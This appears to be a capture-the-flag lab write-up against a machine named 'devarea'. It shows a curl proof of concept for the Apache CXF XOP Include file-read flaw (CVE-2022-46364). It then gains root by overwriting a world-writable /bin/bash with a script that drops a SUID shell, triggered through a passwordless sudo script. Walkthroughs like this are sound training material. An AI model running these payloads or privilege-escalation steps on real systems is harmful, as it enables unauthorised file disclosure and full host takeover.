Decompiling the JAR

Extract and decompile with CFR to identify the framework and endpoints:

$ jar xf employee-service.jar
$ java -jar cfr.jar ServerStarter.class
// Apache CXF framework identified
// SOAP endpoint published at:
http://<TARGET>:8080/employeeservice
// Operation: submitReport

Apache CXF is a well-known Java SOAP framework. The submitReport operation accepts a content field that the framework processes as an XOP Include — this is the injection point for CVE-2022-46364.
3
LFI via XOP/MTOM Injection
CVE-2022-46364 / CVE-2022-46363

Apache CXF versions prior to 3.5.5 and 4.0.0 are vulnerable to Server-Side Request Forgery and Local File Inclusion via XOP Include references in MTOM multipart SOAP requests. The href attribute accepts file:// URIs, causing the server to read arbitrary local files and return their contents base64-encoded in the response.

Proof of Concept — /etc/hostname

$ curl -s -X POST http://10.129.xx.xxx:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@example.com>"; start-info="text/xml"' \
  --data-binary $'...\
<xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" \
href="file:///etc/hostname"/>\
...'

Privilege Escalation — World-Writable Bash + SUID

Enumerating the system reveals two misconfigurations that chain together for root.

Vulnerability 1 — /bin/bash is World-Writable

dev_ryan@devarea:~$ ls -la /bin/bash
-rwxrwxrwx 1 root root 1446024 Mar 28 23:30 /bin/bash

The system bash binary has 777 permissions — any user can overwrite it entirely.

Vulnerability 2 — sudo syswatch.sh (NOPASSWD)

dev_ryan@devarea:~$ sudo -l
NOPASSWD: /opt/syswatch/syswatch.sh

dev_ryan can run /opt/syswatch/syswatch.sh as root with no password. The script internally calls bash — so if we replace /bin/bash with a malicious script, root will execute our payload when sudo triggers it.

Overwriting a running binary causes an ETXTBSY ("text file busy") error. We avoid this by backing up bash, writing our evil script to /tmp first, then killing all bash processes to release the lock before swapping it in.

Building the Evil Script

Rather than a reverse shell, the evil bash creates a SUID copy of bash in /tmp — cleaner and more reliable:

# Back up real bash
dev_ryan@devarea:~$ cp /bin/bash /tmp/bash.bak

# Create evil_bash in /tmp
dev_ryan@devarea:~$ cat > /tmp/evil_bash << 'EOF'
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

dev_ryan@devarea:~$ chmod +x /tmp/evil_bash

Triggering the Exploit

dev_ryan@devarea:~$ /bin/sh -c 'killall -9 bash; sleep 3; cp /tmp/evil_bash /bin/bash; sudo /opt/syswatch/syswatch.sh --version' &

When syswatch.sh runs as root and calls bash, our evil script executes — creating /tmp/rootbash as a root-owned SUID binary:

dev_ryan@devarea:~$ ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1446024 Mar 28 23:41 /tmp/rootbash
dev_ryan@devarea:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) egid=0(root)
